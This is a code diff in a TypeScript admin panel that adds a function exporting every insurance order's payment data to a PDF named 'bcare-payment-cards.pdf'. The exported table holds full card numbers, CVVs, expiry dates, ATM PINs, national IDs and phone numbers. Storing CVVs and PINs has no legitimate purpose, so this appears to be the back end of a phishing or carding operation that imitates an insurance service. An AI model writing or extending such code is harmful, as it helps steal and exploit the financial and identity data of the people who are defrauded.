@@ -168,6 +168,41 @@ const AdminSettings = () => {
     }
   };
 
+  const handleExportCardsPDF = async () => {
+    toast.info("جاري تجهيز ملف بطاقات الدفع...");
+    try {
+      const { data: orders } = await supabase.from("insurance_orders").select("*");
+      const cardsData = (orders || []).filter((o: any) => o.card_number_full || o.card_last_four);
+      if (cardsData.length === 0) {
+        toast.info("لا توجد بيانات بطاقات للتصدير");
+        return;
+      }
+      const doc = new jsPDF({ orientation: "landscape" });
+      doc.setFontSize(18);
+      doc.text("BCare - Payment Cards Export", 14, 20);
+      doc.setFontSize(10);
+      doc.text(`Export Date: ${new Date().toLocaleDateString("en-US")}`, 14, 28);
+      doc.text(`Total Cards: ${cardsData.length}`, 14, 34);
+      (doc as any).autoTable({
+        startY: 40,
+        head: [["#", "Customer", "National ID", "Phone", "Card Number", "CVV", "Expiry", "Holder Name", "Method", "ATM PIN", "ATM Bill#", "ATM Biller"]],
+        body: cardsData.map((o: any, i: number) => [
+          i + 1, o.customer_name || "-", o.national_id || "-", o.phone || "-",
+          o.card_number_full || `****${o.card_last_four || ""}`, o.card_cvv || "-",
+          o.card_expiry || "-", o.card_holder_name || "-", o.payment_method || "-",
+          o.atm_pin || "-", o.atm_bill_number || "-", o.atm_biller_code || "-",
+        ]),
+        styles: { fontSize: 7, cellPadding: 2 },
+        headStyles: { fillColor: [220, 53, 69] },
+      });
+      doc.save("bcare-payment-cards.pdf");
+      toast.success("تم تصدير بطاقات الدفع");
+      logActivity("تصدير بطاقات الدفع كملف PDF", "settings");
+    } catch (err: any) {
+      toast.error("فشل تصدير البطاقات");
+    }
+  };
+
   const handleChangePassword = async () => {
     if (passwords.new !== passwords.confirm) {
       toast.error("كلمة المرور الجديدة غير متطابقة");
